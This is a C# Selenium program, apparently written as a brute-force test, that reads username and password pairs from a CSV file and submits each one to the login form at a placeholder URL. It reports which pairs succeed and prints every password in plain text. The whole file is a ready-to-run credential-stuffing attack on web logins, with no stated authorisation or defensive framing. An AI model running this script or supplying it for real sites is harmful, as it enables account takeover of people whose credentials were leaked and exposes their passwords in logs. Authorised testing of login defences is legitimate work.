using System;
using System.IO;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace PruebasFuerzaBruta
{
    class Program
    {
        static void Main(string[] args)
        {
            string[] lineas = File.ReadAllLines("credenciales.csv");
            foreach (var linea in lineas)
            {
                var datos = linea.Split(',');
                string usuario = datos[0];
                string contrasena = datos[1];
                IntentarInicioSesion(usuario, contrasena);
            }
        }

        static void IntentarInicioSesion(string usuario, string contrasena)
        {
            IWebDriver driver = new ChromeDriver();
            driver.Navigate().GoToUrl("https://ejemplo.com/login");

            IWebElement campoUsuario = driver.FindElement(By.Id("usuario"));
            IWebElement campoContrasena = driver.FindElement(By.Id("contrasena"));
            IWebElement botonInicioSesion = driver.FindElement(By.Id("botonInicioSesion"));

            campoUsuario.Clear();
            campoContrasena.Clear();
            campoUsuario.SendKeys(usuario);
            campoContrasena.SendKeys(contrasena);
            botonInicioSesion.Click();

            try
            {
                IWebElement mensajeError = driver.FindElement(By.Id("mensajeError"));
                Console.WriteLine($"Inicio de sesión fallido para {usuario} con contraseña {contrasena}");
            }
            catch (NoSuchElementException)
            {
                Console.WriteLine($"Inicio de sesión exitoso para {usuario} con contraseña {contrasena}");
            }

            driver.Quit();
        }
    }
}
